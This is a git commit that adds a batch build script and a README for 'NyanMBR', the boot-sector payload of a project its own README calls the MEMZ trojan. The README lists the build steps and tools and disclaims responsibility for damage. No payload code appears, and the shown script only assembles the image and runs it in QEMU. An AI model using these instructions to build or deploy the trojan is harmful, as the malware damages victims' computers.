54aa9653ef8f3cdbcfdb2cad05c29d18b618ff5d
WobbyChip <66483092+WobbyChip@users.noreply.github.com>
2020-07-06 21:16:21 +0300

    Add files via upload

---
+++ NyanMBR/Create.bat
@@ -0,0 +1,45 @@
+@echo off
+title NyanMBR
+color 0a
+
+:Check
+if exist disk.img goto QEMU
+if exist Build\frames.bin del Build\frames.bin /F /Q >nul
+if exist Build\song.bin del Build\song.bin /F /Q >nul
+if exist Build\special.bin del Build\special.bin /F /Q >nul
+if exist Build\stage2-uncompressed.bin del Build\stage2-uncompressed.bin /F /Q >nul
+if exist Build\stage2-compressed.bin del Build\stage2-compressed.bin /F /Q >nul
+cls
+
+
+:Start
+Data\Image\png2bin.exe Data\Image\Special\01.png Build\special.bin
+Data\Song\midi2bin.exe Data\Song\midi2bin.mid Build\song.bin
+cd Data\Image\Frames >nul
+if exist 11.png ..\png2bin.exe 00.png 01.png 02.png 03.png 04.png 05.png 06.png 07.png 08.png 09.png 10.png 11.png ..\..\..\Build\frames.bin & goto Next
+if exist 10.png ..\png2bin.exe 00.png 01.png 02.png 03.png 04.png 05.png 06.png 07.png 08.png 09.png 10.png ..\..\..\Build\frames.bin & goto Next
+if exist 09.png ..\png2bin.exe 00.png 01.png 02.png 03.png 04.png 05.png 06.png 07.png 08.png 09.png ..\..\..\Build\frames.bin & goto Next
+if exist 08.png ..\png2bin.exe 00.png 01.png 02.png 03.png 04.png 05.png 06.png 07.png 08.png ..\..\..\Build\frames.bin & goto Next
+if exist 07.png ..\png2bin.exe 00.png 01.png 02.png 03.png 04.png 05.png 06.png 07.png ..\..\..\Build\frames.bin & goto Next
+if exist 06.png ..\png2bin.exe 00.png 01.png 02.png 03.png 04.png 05.png 06.png ..\..\..\Build\frames.bin & goto Next
+if exist 05.png ..\png2bin.exe 00.png 01.png 02.png 03.png 04.png 05.png ..\..\..\Build\frames.bin & goto Next
+if exist 04.png ..\png2bin.exe 00.png 01.png 02.png 03.png 04.png ..\..\..\Build\frames.bin & goto Next
+if exist 03.png ..\png2bin.exe 00.png 01.png 02.png 03.png ..\..\..\Build\frames.bin & goto Next
+if exist 02.png ..\png2bin.exe 00.png 01.png 02.png ..\..\..\Build\frames.bin & goto Next
+if exist 01.png ..\png2bin.exe 00.png 01.png ..\..\..\Build\frames.bin & goto Next
+if exist 00.png ..\png2bin.exe 00.png ..\..\..\Build\frames.bin & goto Next
+
+
+
+:Next
+cd ..\..\Source >nul
+..\..\Programs\nasm.exe -f bin main.asm -o ..\..\Build\stage2-uncompressed.bin
+..\..\Programs\compress.exe ..\..\Build\stage2-uncompressed.bin ..\..\Build\stage2-compressed.bin >nul
+..\..\Programs\nasm.exe -o ..\..\disk.img bootloader.asm
+cd ..\.. >nul
+
+
+:QEMU
+pause
+Programs\QEMU\qemu -s -soundhw pcspk -fda disk.img
+exit
--- README.md
+++ README.md
@@ -1,1 +1,22 @@
 # MEMZ
+LOL
+
+I am not responsible for any damage made using this trojan.
+
+The build scripts and converters for the MBR payload are very noobish. You will need some things to run these:
+Actually you don't need all of that because MBR is already built and also has automated script.
+
+ - Python 2.7 for Windows and [this](https://github.com/vishnubob/python-midi) library.
+ - git for Windows or some other linux tools for windows like MinGW
+ - NASM in your PATH (I just copyed the executable into C:\Windows\ because I was too lazy to add it to the PATH manually)
+ - The [Nyan Cat midi file](http://morganatmacsd.tumblr.com/post/7275362575/midi-file-for-nyan-cat-song)
+ - Something to convert binary files into C arrays, to embed the MBR payload into the trojan (I used the export function of the HxD hex editor, you will only need that if you changed and recompiled the MBR payload)
+ - qemu for Windows (additional, if you want to test the payload)
+
+Even if you have all of this I don't think you get this to compile because my scripts suck, as I said earlier.
+ 
+If you want to use the exe to batch converter, don't forget to append -zip to it's command line, because this gives way smaller file sizes and also works on Windows XP.
+
+You'll also need Visual Studio 2015 to build the actual Trojan. Make sure you selected the Release configuration, because Debug is not configured properly.
+
+
